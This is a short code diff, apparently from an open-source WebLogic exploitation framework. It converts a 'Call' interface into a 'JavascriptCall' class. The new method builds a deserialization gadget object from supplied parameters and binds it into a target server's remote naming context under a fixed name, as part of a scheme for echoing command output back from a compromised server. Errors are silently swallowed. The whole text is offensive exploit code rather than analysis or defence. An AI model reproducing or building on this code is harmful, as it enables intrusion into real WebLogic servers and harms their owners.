@@ -19,19 +19,18 @@ import com.r4v3zn.weblogic.framework.entity.ContextPojo;
 import com.r4v3zn.weblogic.framework.entity.GadgetParam;
 import com.r4v3zn.weblogic.framework.gadget.ObjectGadget;
 import com.r4v3zn.weblogic.framework.vuls.VulTest;
-import org.apache.logging.log4j.LogManager;
-import org.apache.logging.log4j.Logger;
 
 /**
- * Title: Call
- * Desc: Call
- * Date:2020/4/4 23:18
- * @author 0nise
+ * Title: JavascriptCall
+ * Desc: javascript 回显
+ * Date:2020/7/15 23:34
+ * Email:woo0nise@gmail.com
+ * Company:www.j2ee.app
+ *
+ * @author R4v3zn
  * @version 1.0.0
  */
-public interface Call {
-
-    Logger log = LogManager.getLogger(LogManager.ROOT_LOGGER_NAME);
+public class JavascriptCall implements Call {
 
     /**
      * 执行回显方案前置
@@ -42,5 +41,14 @@ public interface Call {
      * @param contextPojo 链接对象
      * @return
      */
-    ContextPojo executeCall(GadgetParam param, VulTest vulTest, final Class<? extends ObjectGadget<?>> gadgetClazz, ContextPojo contextPojo);
+    @Override
+    public ContextPojo executeCall(GadgetParam param, VulTest vulTest, Class<? extends ObjectGadget<?>> gadgetClazz, ContextPojo contextPojo) {
+        try {
+            ObjectGadget gadget = gadgetClazz.newInstance();
+            Object object = gadget.getObject(param);
+            contextPojo.getContext().rebind("hello_8kgumc08erbo7osp", object);
+        } catch (Exception e) {
+        }
+        return contextPojo;
+    }
 }
